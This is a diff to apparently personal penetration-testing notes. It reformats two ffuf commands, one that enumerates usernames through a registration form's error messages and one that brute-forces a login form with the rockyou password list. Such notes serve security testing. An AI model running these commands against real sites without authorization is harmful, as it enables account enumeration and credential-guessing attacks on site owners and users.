@@ -163,7 +163,10 @@ Threat Vector: An avenue of attack.
 Use ffuf to enumerate potential users based on a wordlist (assumes that the form we’re hitting is not AJAX-y):
 
 ```bash
-ffuf -w /usr/share/wordlists/wfuzz/others/names.txt -X POST -d "$POST_VARS" -H "Content-Type: application/x-www-form-urlencoded" -u $FORM_URL -mr "$ERROR_MEESAGE_SUBSTRING"
+ffuf -w /usr/share/wordlists/wfuzz/others/names.txt \
+     -X POST -d "$POST_VARS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u $FORM_URL -mr "$ERROR_MEESAGE_SUBSTRING"
 ```
 
 Here `$POST_VARS` should look something like `username=FUZZ&email=FUZZ@example.com&password=1234&cpassword=1234` (recall that FUZZ is the variable that ffuf will be fuzzing over). The `-mr` flag instructs ffuf to filter on page text for a “successful hit”.
@@ -177,7 +180,10 @@ Note that ffuf is kind of noisy in its default output, so when generating user l
 Ffuf can also be used as a simple brute-forcer:
 
 ```bash
-ffuf -w /usr/share/wordlists/wfuzz/others/names.txt:W1,$HOME/.local/share/red-team/wordlists/rockyou.txt:W2 -X POST -d "$POST_VARS" -H "Content-Type: application/x-www-form-urlencoded" -u $LOGIN_URL -fc 200
+ffuf -w /usr/share/wordlists/wfuzz/others/names.txt:W1,$HOME/.local/share/red-team/wordlists/rockyou.txt:W2 \
+     -X POST -d "$POST_VARS" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -u $LOGIN_URL -fc 200
 ```
 
 Here we assign W1 and W2 to take terms from the two supplied wordlists; `$POST_VARS` then looks something like `username=W1&password=W2`. This example assumes that a successful login will return an HTTP status code *other* than 200 (probably a 301 or 302).
